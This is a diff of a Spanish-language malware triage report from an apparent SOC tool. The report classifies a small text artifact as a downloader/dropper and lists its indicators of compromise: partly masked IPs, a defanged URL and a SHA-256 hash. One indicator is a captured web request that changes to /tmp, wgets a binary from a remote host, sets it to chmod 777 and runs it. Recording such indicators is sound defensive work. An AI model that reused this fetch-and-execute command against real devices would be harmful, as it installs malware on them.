@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 267 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `kaizen.arm7sf_srv+-O+.k` en `hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv+-O+.k`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:56:11+00:00`
+- **Registrado:** `2026-08-09T19:56:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,10 +54,10 @@ GET /shell?cd+/tmp;wget+hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv+-O+.k;ch
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 196.251.121.XXX | static_analysis |
 | url | hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv+-O+.k;chmod+777+.k;./.k | strings |
-| hash | 196bfe338a07f1d568033efbce32a3606612ed513b1c6ec741e9cc0c3fb8621b | static_analysis |
+| ip | 196.251.121.XXX | static_analysis |
 | command | GET /shell?cd+/tmp;wget+hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv+-O+.k;chmod+777+.k;./.k HTTP/1.1 | strings |
+| hash | 196bfe338a07f1d568033efbce32a3606612ed513b1c6ec741e9cc0c3fb8621b | static_analysis |
 | ip | 170.155.2.XXX | artifact_source |
 
 ## 🔎 Triage
